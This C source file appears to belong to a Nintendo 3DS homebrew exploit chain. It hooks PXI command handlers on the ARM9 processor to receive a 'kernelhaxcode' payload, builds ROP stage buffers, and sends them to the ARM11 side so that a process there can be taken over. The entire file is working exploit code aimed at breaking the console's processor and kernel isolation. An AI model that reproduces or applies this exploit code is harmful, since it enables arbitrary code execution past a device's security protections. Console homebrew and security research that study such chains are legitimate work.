#include <string.h>
#include "PXI.h"
#include "types.h"
#include "rop/pxi11.h"
#include "heap.h"
#include "../kernelhaxcode_3ds/takeover.h"

/*
  Header of kernelhaxcode binary.
*/
struct khc_hdr {
  u32 branch_instr;
  u32 base_addr;
  u32 arm9_bin_addr;
};

/*
  Parameters for kernelhaxcode when p9 has already been pwned.
*/
struct khc_p9_takeover_params {
  BlobLayout* blob_layout;
  u32 nb_cores;
  void (*callback)(void*);
  void* callback_arg;
};

/*
  Header of kernelhaxcode arm9 binary.
*/
struct khc_arm9_hdr {
  u32 normal_start;
  u32 p9_pwned_start;
  u32 padding[2];
  struct khc_p9_takeover_params takeover_params;
};

/*
  BlobLayout where the kernelhaxcode will be copied.
*/
static BlobLayout* const blob_layout = (BlobLayout*)0x20000000;
/*
  Heap buffer in which the kernelhaxcode binary is received and size of the
  binary.
*/
static struct khc_hdr* khc_buf = NULL;
static u32 khc_size = 0;

extern void panic();

u32 pxiamImportCertificatesHook(u32 *cmdbuf) {
  u8** payload_chunks = (u8**)(cmdbuf[6]);
  khc_size = cmdbuf[1];

  khc_buf = heapAllocate(khc_size);
  if(!khc_buf)
    panic();

  u32 i = 0;
  u32 offset = 0;
  while(offset != khc_size)
  {
    u32 len = 0x1000 - ((u32)payload_chunks[i] & 0xFFF);
    if(len > khc_size - offset)
      len = khc_size - offset;
    memcpy((u8*)khc_buf + offset, payload_chunks[i], len);
    offset += len;
    i++;
  }

  return 0;
}

void pximcShutdownReply(void* arg) {
  const u32 PXIMC_ID = 0x0;
  memcpy(blob_layout->code, khc_buf, khc_size);

  u32 stage1[stage1MaxSize()/4];
  u32 stage1_words_size = setupPxi11Stage1RopBuffer(stage1);

  u32* cmdbuf = (u32*)arg;
  u32 stage0_words_size = 
    setupPxi11Stage0RopCmdBuf(cmdbuf, stage1_words_size*4);
  PXISendWord(PXIMC_ID);
  PXITriggerSync11IRQ();
  PXISendBuffer(cmdbuf, stage0_words_size);

  PXISendWord(0xDEAD);
  while(!PXIIsSendFIFOEmpty()); //wait for PXIReset on arm11 side

  PXISendBuffer(stage1, stage1_words_size);
}

void* pximcShutdownHook(u32* cmdbuf) {
  u32 khc_arm9_offset = khc_buf->arm9_bin_addr - khc_buf->base_addr;
  struct khc_arm9_hdr* arm9_hdr =
    (struct khc_arm9_hdr*)((u8*)khc_buf + khc_arm9_offset);

  struct khc_p9_takeover_params* takeover_params = &arm9_hdr->takeover_params;
  takeover_params->blob_layout = blob_layout;
  takeover_params->nb_cores = 2; //o3ds
  takeover_params->callback = pximcShutdownReply;
  takeover_params->callback_arg = cmdbuf;

  void(*khc_entry)(void) = (void (*)(void))(&arm9_hdr->p9_pwned_start);

  khc_entry();
  __builtin_unreachable();
}
